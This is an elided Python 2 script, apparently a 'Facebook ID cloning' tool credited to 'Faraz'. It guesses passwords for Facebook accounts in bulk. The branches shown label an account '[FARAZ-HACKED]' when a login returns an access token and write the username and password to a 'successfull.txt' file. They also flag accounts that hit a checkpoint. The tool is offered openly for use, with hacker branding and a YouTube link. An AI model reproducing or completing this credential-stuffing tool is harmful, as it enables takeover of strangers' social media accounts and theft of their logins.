...
print
print("no Faraz& Ali")
print("this tool is free by Faraz")
print
psb('\x1b[1;32mYOU ENTERING BD SUPER FAST FB ID CLONING TOOL PLEASE WAIT......THIS TOOL MAKE BY Faraz.......ANY ONE COPY THIS CODE! CREDIT ME ........Faraz-Ali-hacker......................................OPENING.............')
for n in range(9999):
...
def menu():
    ...
    print 
    print ''
    print'FB OLD ID CLONING [Faraz]'
    print 50* '-'
    print 'Codder.  : FARAZ'
    print 'AUTHOR   : FARAZ KHAN'
    print 'Youtube :https://youtube.com/channel/UC-l2_5H5kmsHOEOCZzSrncw '
    print 'GITHUB   : NEW USSR'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mFastbangla'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[FARAZ-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[MAMUN-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[(Faraz)Open After 03 Days]\x1b[0m \n'
